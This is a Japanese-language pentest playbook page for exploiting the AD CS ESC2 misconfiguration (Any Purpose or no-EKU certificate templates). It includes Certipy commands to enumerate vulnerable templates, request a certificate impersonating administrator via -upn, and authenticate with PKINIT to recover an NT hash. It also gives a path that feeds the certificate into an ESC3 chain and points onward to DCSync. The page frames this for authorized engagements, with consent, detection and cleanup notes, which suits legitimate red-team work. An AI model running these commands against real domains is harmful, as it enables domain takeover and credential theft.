# ESC2 — Any Purpose EKU / SubCA テンプレート

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 持続化に該当（ESC3 チェーンを経て任意ユーザーの証明書発行につながる）
> - [x] SIEM/EDR で確実に検知される（Event ID 4886・4887・4768）
> - [ ] 業務停止リスク（証明書発行自体は業務影響なし）
> - [ ] 不可逆な設定変更を含む（証明書失効で回収可能）
>
> 実施可否は事前合意で明示確認すること。取得した証明書は案件終了時に CA で失効させること。
> 演習環境では制約なし。

---

## 着火条件

以下のいずれかが Certipy の出力で確認できるときに実施する：

- 対象テンプレートに `[!] Vulnerabilities: ESC2` が表示されている
- または以下の条件が手動で確認できる：
  - `Any Purpose: True`（EKU が "Any Purpose"、または EKU フィールドが空 ＝ SubCA 相当）
  - `Requires Manager Approval: False`
  - `Authorized Signatures Required: 0`
  - `Enrollment Rights` に低権限グループが含まれる

**攻撃者の思考トレース：** EKU が「Any Purpose」または「なし（SubCA）」であれば、その証明書は Client Authentication にも Enrollment Agent にも使える。直接 PKINIT に使える（ESC1 と同様に `-upn` を組み合わせれば管理者証明書が取れる）場合と、ESC3 の第1ステップ（Enrollment Agent 証明書の取得）として使える場合の両方がある。状況によって使い分ける。

---

## 環境前提

- **実行環境**: テスター端末（ドメインユーザー権限・ネットワーク到達性があること）
- **必要なツール**: Certipy（`pip install certipy-ad --break-system-packages`。要インストール確認）
- **必要な権限**: 対象テンプレートへの Enrollment 権限を持つドメインユーザー（低権限ユーザーで可）
- **オフライン代替**: Certipy 非使用環境では `certreq` による手動 CSR 申請（Windows 端末要）

---

## 観点・着眼点

### ESC2 の2つの悪用経路

| 経路 | 条件 | 概要 |
|------|------|------|
| **経路A**：直接 PKINIT 認証 | Enrollee Supplies Subject が True、または CA に ESC6 フラグあり | ESC1 と同様に `-upn [TARGET]` で管理者証明書を申請 |
| **経路B**：ESC3 第1ステップ | Enrollment Agent として使える Any Purpose 証明書を取得 | この証明書を使い、別テンプレートで任意ユーザーの証明書を代理申請 |

まず Certipy の出力で `Enrollee Supplies Subject` を確認し、True であれば経路A（直接悪用）を先に試す。

### 先に確認すること

```bash
# [Attacker] 脆弱テンプレートの列挙
certipy find \
  -u [USER]@[DOMAIN] \
  -p [PASSWORD] \
  -dc-ip [DC_IP] \
  -vulnerable \
  -stdout
```

ESC2 の出力例：

```
Certificate Templates
  0
    Template Name                       : [VULNERABLE_TEMPLATE]
    Any Purpose                         : True
    Enrollee Supplies Subject           : False     ← False の場合は経路B（ESC3 チェーン）
    Requires Manager Approval           : False
    Authorized Signatures Required      : 0
    Enrollment Rights                   : EXAMPLE.LOCAL\Domain Users
    [!] Vulnerabilities
      ESC2                              : 'EXAMPLE.LOCAL\Domain Users' can enroll and template
                                          has dangerous Any Purpose EKU or no EKU
```

---

## 手順

事前準備（必須）：時刻同期（Kerberos は時刻ずれ ±5 分以内が必要）

```bash
# [Attacker] DC との時刻同期
sudo ntpdate -u [DC_IP]
```

### 経路A：Enrollee Supplies Subject が True の場合（直接悪用）

ESC1 と同じ手順で、`-upn` で任意の UPN を指定して証明書を申請する：

```bash
# [Attacker] 任意 UPN で証明書申請
certipy req \
  -ca [CA_NAME] \
  -template [VULNERABLE_TEMPLATE] \
  -u [USER]@[DOMAIN] \
  -p [PASSWORD] \
  -dc-ip [DC_IP] \
  -upn administrator@[DOMAIN]
# → administrator.pfx が生成される

# [Attacker] PKINIT 認証 → NT ハッシュ取得
certipy auth -pfx administrator.pfx -dc-ip [DC_IP]
```

詳細フロー → `ESC1.md`（Step 2・Step 3 と同一）

### 経路B：Enrollment Agent 証明書として取得し ESC3 チェーンへ

Any Purpose 証明書は Enrollment Agent として機能するため、ESC3 の第1ステップとして使用する：

```bash
# [Attacker] Any Purpose 証明書を Enrollment Agent として取得
certipy req \
  -ca [CA_NAME] \
  -template [VULNERABLE_TEMPLATE] \
  -u [USER]@[DOMAIN] \
  -p [PASSWORD] \
  -dc-ip [DC_IP]
# → [USER].pfx が生成される（Enrollment Agent 証明書として機能）
```

→ この pfx を使って ESC3 の Step 2 へ。詳細 → `ESC3.md`

---

## 刺さらなかったとき

| 状況 | 対処 |
|------|------|
| 経路A で `certipy req` が `CERTSRV_E_SUBJECT_EMAIL_REQUIRED` | テンプレートが SAN ではなくメールを必須とする。`Enrollee Supplies Subject` が実際には False の可能性。経路B（ESC3 チェーン）へ |
| 経路B で ESC3 に進んだが失敗する | ESC3 の前提条件を `Overview.md` で再確認する |
| Any Purpose テンプレートが見当たらない | SubCA 相当（EKU なし）テンプレートも ESC2 に該当する。`certipy find` の `Extended Key Usage` が空のテンプレートを探す |
| `Enrollment Rights` に自分のグループが含まれない | より高い権限のアカウントが必要。または ESC4 / ESC7 でテンプレートACLを変更できるか確認 |

---

## 注意点・落とし穴

- **ESC2 単体では悪用できないケースがある**：`Enrollee Supplies Subject` が False かつ CA に ESC6 フラグがなければ、ESC2 の証明書は直接 PKINIT に使えない。その場合は ESC3 チェーンとして評価する
- **Any Purpose 証明書は Enrollment Agent として CA が認識する場合がある**：一部の CA 設定では追加の Enrollment Agent テンプレートが不要になる

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。ESC3 チェーンを経た任意ユーザー証明書発行はドメイン全体への影響
- **想定されるSIEM/EDR検知**: Event ID 4886・4887（証明書発行）/ 4768（TGT 要求）
- **業務影響リスク**: 証明書発行自体は業務影響なし
- **原状回復必須項目**: ✅ 発行した証明書を CA で失効 / ✅ 取得した pfx・NT ハッシュ・TGT の暗号化保管・案件終了時破棄
- **取得情報の取扱**: pfx ファイル・NT ハッシュ・TGT は暗号化保管、案件終了後破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：AD CS の列挙と ESC 番号の特定 → `./Overview.md`
- 後（経路A）：直接 PKINIT → NT ハッシュ取得の詳細手順 → `./ESC1.md`
- 後（経路B）：Enrollment Agent 証明書を使った代理申請 → `./ESC3.md`
- 後：証明書取得後 → PKINIT → DCSync → `../Credential_Dumping.md`
- ツール詳細 → `../../05_Tools_Reference/Certipy.md`
